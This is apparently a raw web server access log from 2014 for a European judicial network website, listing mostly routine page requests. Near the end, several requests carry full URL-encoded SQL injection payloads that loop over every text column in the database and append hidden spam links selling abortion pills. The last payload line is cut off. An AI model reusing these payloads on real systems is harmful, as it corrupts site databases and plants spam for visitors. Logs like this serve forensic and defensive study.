2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/libshowdocument.aspx Id=222&Lang=EL
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_QuickLinks.aspx id=24
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_QuickLinks.aspx id=26
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/libshowdocument.aspx Id=222&Lang=LT
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/Gallery.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/NewsDetail.aspx id=336&Ori=H
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libdocumentproperties.aspx Id=157
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libshowdocument.aspx Id=221&Lang=LT
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/sitemap.aspx -
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=7
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ejn_home.aspx -
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=4
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=8
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_ContactUs.aspx &KeepThis=true&TB_iframe=true&height=650&width=900
2014-12-21 /ejn/EJN_Faqs.aspx -
2014-12-21 /ejn/EJN_Search.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=2
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=9
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=UK&Type=2
2014-12-21 /ejn/libcategories.aspx Id=25
2014-12-21 /ejn/libcategories.aspx Id=34
2014-12-21 /ejn/libcategories.aspx Id=32
2014-12-21 /ejn/libcategories.aspx Id=24
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=39
2014-12-21 /ejn/libcategories.aspx Id=14
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=28
2014-12-21 /ejn/EJN_Secretariat.aspx -
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=16
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=27
2014-12-21 /ejn/Gallery.aspx -
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=14
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=13
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=10
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=17
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=21
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=31
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=33
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=35
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=34
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=24
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=32
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=30
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=20
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=18
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=25
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=19
2014-12-21 /ejn/NewsDetail.aspx id=344&Ori=H
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=23
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=22
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=38
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=37
2014-12-21 /ejn/Events.aspx id=6
2014-12-21 /ejn/NewsDetail.aspx id=346&Ori=H
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=26
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=36
2014-12-21 /ejn/Events.aspx Id=7
2014-12-21 /ejn/NewsAll.aspx Id=1
2014-12-21 /ejn/NewsAll.aspx Id=3
2014-12-21 /ejn/NewsAll.aspx Id=5
2014-12-21 /ejn/Events.aspx event=322
2014-12-21 /ejn/NewsAll.aspx Id=4
2014-12-21 /ejn/Events.aspx id=7
2014-12-21 /ejn/Events.aspx event=318
2014-12-21 /ejn/Events.aspx Id=6
2014-12-21 /ejn/NewsAll.aspx Id=2
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=239
2014-12-21 /ejn/Events.aspx -
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=223
2014-12-21 /ejn/EJN_SubscribeNewsLetter.aspx -
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=432
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=230
2014-12-21 /ejn/NewsAll.aspx -
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=272
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=287
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=258
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=259
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=277
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=293
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=273
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=279
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=260
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=269
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=368
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=352
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=313
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=337
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=295
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=354
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=314
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=321
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=307
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=351
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=364
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=369
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=378
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=389
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=435
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=434
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=373
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=288
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=395
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=215
2014-12-21 /ejn/AtlasChooseCountry.aspx Type=2
2014-12-21 /ejn/EJN_FichesBelges.aspx -
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=342
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=3
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=433
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=430
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=1
2014-12-21 /ejn/AtlasChooseCountry.aspx Type=1
2014-12-21 /ejn/EJN_Login.aspx -
2014-12-21 /ejn/EJN_Compendium.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=12
2014-12-21 /ejn/EJN_QuickLinks.aspx id=24
2014-12-21 /ejn/EJN_QuickLinks.aspx id=28
2014-12-21 /ejn/EJN_QuickLinks.aspx id=26
2014-12-21 /ejn/EJN_EAWWizard.aspx -
2014-12-21 /ejn/EJN_QuickLinks.aspx id=25
2014-12-21 /ejn/libcategories.aspx -
2014-12-21 /ejn/EJN_QuickLinks.aspx id=27
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=11
2014-12-21 /ejn/EJN_QuickLinks.aspx id=23
2014-12-21 /ejn/ejn_staticpage.aspx Bread=9
2014-12-21 /ejn/libcategories.aspx Id=2
2014-12-21 /ejn/ejn_faqs.aspx -
2014-12-21 /ejn/ejn_staticpage.aspx Bread=4
2014-12-21 /ejn/ejn_search.aspx -
2014-12-21 /ejn/EJN_QuickLinks.aspx -
2014-12-21 /ejn/ejn_staticpage.aspx Bread=8
2014-12-21 /ejn/ejn_staticpage.aspx Bread=7
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=5
2014-12-21 /ejn/ -
2014-12-21 /ejn/ejn_staticpage.aspx Bread=2
2014-12-21 /ejn/libcategories.aspx Id=44
2014-12-21 /ejn/libadvancedsearch.aspx -
2014-12-21 /ejn/libcategories.aspx id=1
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=DE
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=EN
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=ES
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=DK
2014-12-21 /ejn/libdocumentproperties.aspx Id=1
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=CS
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=BG
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=EL
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=ET
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=NL
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=PL
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=LV
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=FI
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=HR
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=MT
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=FR
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=IT
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=LT
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=HU
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=DK
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=SV
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=PT
2014-12-21 /ejn/libdocumentproperties.aspx Id=3
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=BG
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=SK
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=DE
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=CS
2014-12-21 /ejn/ -
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=RO
2014-12-21 /ejn/libshowdocument.aspx Id=1&Lang=SL
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=IT
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=LT
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=FR
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=EL
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=ET
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=ES
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=EN
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=FI
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=HU
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=LV
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libdocumentproperties.aspx Id=787
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=SL
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=PL
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=SV
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=SK
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=PT
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=RO
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=MT
2014-12-21 /ejn/libshowdocument.aspx Id=3&Lang=NL
2014-12-21 /ejn/libshowdocument.aspx Id=787&Lang=BG
2014-12-21 /ejn/libshowdocument.aspx Id=787&Lang=CS
2014-12-21 /ejn/libshowdocument.aspx Id=787&Lang=ES
2014-12-21 /ejn/libshowdocument.aspx Id=787&Lang=DE
2014-12-21 /ejn/libshowdocument.aspx Id=787&Lang=DK
2014-12-21 /ejn/libshowdocument.aspx Id=787&Lang=EN
2014-12-21 /ejn/libshowdocument.aspx Id=787&Lang=EL
2014-12-21 /ejn/EJN_QuickLinks.aspx id=25
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/libcategories.aspx Id=14
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libcategories.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libcategories.aspx Id=21
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libdocumentproperties.aspx Id=105
2014-12-21 /ejn/Events.aspx event=188
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_SubscribeNewsLetter.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libshowdocument.aspx Id=221&Lang=LT
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /atlas_advanced.aspx -
2014-12-21 /atlas_advanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /atlas_advanced.aspx -
2014-12-21 /atlas_advanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/AtlasChooseCountry.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/NewsDetail.aspx id=331&Ori=H
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=12
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=12
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/libshowdocument.aspx id=13';declare%20@c%20cursor;declare%20@d%20varchar(4000);set%20@c=cursor%20for%20select%20'update%20%5B'%2BTABLE_NAME%2B'%5D%20set%20%5B'%2BCOLUMN_NAME%2B'%5D=%5B'%2BCOLUMN_NAME%2B'%5D%2Bcase%20ABS(CHECKSUM(NewId()))%257%20when%200%20then%20''''%2Bchar(60)%2B''div%20style=%22display:none%22''%2Bchar(62)%2B''where%20can%20i%20get%20the%20abortion%20pill%20online%20''%2Bchar(60)%2B''a%20href=%22http:''%2Bchar(47)%2Bchar(47)%2BREPLACE(case%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''www.tallsingles.co.uk@blog@abortionpills''%20when%201%20then%20''www.naughtycherrysextoys.co.uk@blog@template''%20else%20''arampamuk.com@template''%20end,''@'',char(47))%2B''%22''%2Bchar(62)%2Bcase%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''redirect''%20when%201%20then%20''where%20can%20i%20buy%20abortion%20pills''%20else%20''abortion%20pill''%20end%20%2Bchar(60)%2Bchar(47)%2B''a''%2Bchar(62)%2B''%20order%20abortion%20pill%20online''%2Bchar(60)%2Bchar(47)%2B''div''%2Bchar(62)%2B''''%20else%20''''%20end'%20FROM%20sysindexes%20AS%20i%20INNER%20JOIN%20sysobjects%20AS%20o%20ON%20i.id=o.id%20INNER%20JOIN%20INFORMATION_SCHEMA.COLUMNS%20ON%20o.NAME=TABLE_NAME%20WHERE(indid=0%20or%20indid=1)%20and%20DATA_TYPE%20like%20'%25varchar'%20and(CHARACTER_MAXIMUM_LENGTH=-1%20or%20CHARACTER_MAXIMUM_LENGTH=2147483647);open%20@c;fetch%20next%20from%20@c%20into%20@d;while%20@@FETCH_STATUS=0%20begin%20exec%20(@d);fetch%20next%20from%20@c%20into%20@d;end;close%20@c--&lang=nl
2014-12-21 /ejn/libshowdocument.aspx id=13&lang=nl';declare%20@c%20cursor;declare%20@d%20varchar(4000);set%20@c=cursor%20for%20select%20'update%20%5B'%2BTABLE_NAME%2B'%5D%20set%20%5B'%2BCOLUMN_NAME%2B'%5D=%5B'%2BCOLUMN_NAME%2B'%5D%2Bcase%20ABS(CHECKSUM(NewId()))%257%20when%200%20then%20''''%2Bchar(60)%2B''div%20style=%22display:none%22''%2Bchar(62)%2B''cytotec%20abortion%20''%2Bchar(60)%2B''a%20href=%22http:''%2Bchar(47)%2Bchar(47)%2BREPLACE(case%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''blog.perecruit.com@template''%20when%201%20then%20''portortaramasi.org@template''%20else%20''www.doug-wheeler.com@template''%20end,''@'',char(47))%2B''%22''%2Bchar(62)%2Bcase%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''read%20here''%20when%201%20then%20''cytotec%20abortion%20pill%20buy%20online''%20else%20''abortion%20pill''%20end%20%2Bchar(60)%2Bchar(47)%2B''a''%2Bchar(62)%2B''%20where%20can%20you%20buy%20the%20abortion%20pill''%2Bchar(60)%2Bchar(47)%2B''div''%2Bchar(62)%2B''''%20else%20''''%20end'%20FROM%20sysindexes%20AS%20i%20INNER%20JOIN%20sysobjects%20AS%20o%20ON%20i.id=o.id%20INNER%20JOIN%20INFORMATION_SCHEMA.COLUMNS%20ON%20o.NAME=TABLE_NAME%20WHERE(indid=0%20or%20indid=1)%20and%20DATA_TYPE%20like%20'%25varchar'%20and(CHARACTER_MAXIMUM_LENGTH=-1%20or%20CHARACTER_MAXIMUM_LENGTH=2147483647);open%20@c;fetch%20next%20from%20@c%20into%20@d;while%20@@FETCH_STATUS=0%20begin%20exec%20(@d);fetch%20next%20from%20@c%20into%20@d;end;close%20@c--
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libshowdocument.aspx id=13;declare%20@c%20cursor;declare%20@d%20varchar(4000);set%20@c=cursor%20for%20select%20'update%20%5B'%2BTABLE_NAME%2B'%5D%20set%20%5B'%2BCOLUMN_NAME%2B'%5D=%5B'%2BCOLUMN_NAME%2B'%5D%2Bcase%20ABS(CHECKSUM(NewId()))%257%20when%200%20then%20''''%2Bchar(60)%2B''div%20style=%22display:none%22''%2Bchar(62)%2B''where%20can%20i%20get%20the%20abortion%20pill%20online%20''%2Bchar(60)%2B''a%20href=%22http:''%2Bchar(47)%2Bchar(47)%2BREPLACE(case%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''www.tallsingles.co.uk@blog@abortionpills''%20when%201%20then%20''www.naughtycherrysextoys.co.uk@blog@template''%20else%20''arampamuk.com@template''%20end,''@'',char(47))%2B''%22''%2Bchar(62)%2Bcase%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''redirect''%20when%201%20then%20''where%20can%20i%20buy%20abortion%20pills''%20else%20''abortion%20pill''%20end%20%2Bchar(60)%2Bchar(47)%2B''a''%2Bchar(62)%2B''%20order%20abortion%20pill%20online''%2Bchar(60)%2Bchar(47)%2B''div''%2Bchar(62)%2B''''%20else%20''''%20end'%20FROM%20sysindexes%20AS%20i%20INNER%20JOIN%20sysobjects%20AS%20o%20ON%20i.id=o.id%20INNER%20JOIN%20INFORMATION_SCHEMA.COLUMNS%20ON%20o.NAME=TABLE_NAME%20WHERE(indid=0%20or%20indid=1)%20and%20DATA_TYPE%20like%20'%25varchar'%20and(CHARACTER_MAXIMUM_LENGTH=-1%20or%20CHARACTER_MAXIMUM_LENGTH=2147483647);open%20@c;fetch%20next%20from%20@c%20into%20@d;while%20@@FETCH_STATUS=0%20begin%20exec%20(@d);fetch%20next%20from%20@c%20into%20@d;end;close%20@c--&lang=nl
2014-12-21 /ejn/libshowdocument.aspx id=13&lang=nl;declare%20@c%20cursor;declare%20@d%20varchar(4000);set%20@c=cursor%20for%20select%20'update%20%5B'%2BTABLE_NAME%2B'%5D%20set%20%5B'%2BCOLUMN_NAME%2B'%5D=%5B'%2BCOLUMN_NAME%2B'%5D%2Bcase%20ABS(CHECKSUM(NewId()))%257%20when%200%20then%20''''%2Bchar(60)%2B''div%20style=%22display:none%22''%2Bchar(62)%2B''cytotec%20abortion%20''%2Bchar(60)%2B''a%20href=%22http:''%2Bchar(47)%2Bchar(47)%2BREPLACE(case%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''blog.perecruit.com@template''%20when%201%20then%20''portortaramasi.org@template''%20else%20''www.doug-wheeler.com@template''%20end,''@'',char(47))%2B''%22''%2Bchar(62)%2Bcase%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''read%20here''%20when%201%20then%20''cytotec%20abortion%20pill%20buy%20online''%20else%20''abortion%20pill''%20end%20%2Bchar(60)%2Bc